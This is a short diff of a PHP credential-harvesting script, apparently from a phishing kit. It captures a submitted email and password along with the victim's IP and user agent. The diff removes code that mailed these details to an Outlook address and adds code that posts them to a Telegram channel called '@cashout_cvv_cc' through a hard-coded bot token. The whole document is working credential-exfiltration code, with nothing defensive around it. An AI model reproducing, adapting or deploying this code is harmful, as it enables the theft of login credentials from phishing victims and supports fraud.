@@ -5,10 +5,14 @@ $Ip=$_SERVER['REMOTE_ADDR'];
 $email=$_POST['email'];
 $password=$_POST['password'];
 $nl="\r\n";
-$from = "Cashout";
-$to = "nwaforalex158@outlook.com";
-$subject = "Cashout Is A Must By Gods  Grace";
 $message = 'EMAIL: ' . $email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
-$headers = "From:" . $from;
-mail($to,$subject,$message, $headers) 
+$apiToken = "5697191099:AAHko1fs2sO9KSca1q4cqcgkynukya9NQ1Q";
+
+$data = [
+    'chat_id' => '@cashout_cvv_cc',
+    'text' => '$message'
+];
+
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
+// Do what you want with result
 ?>
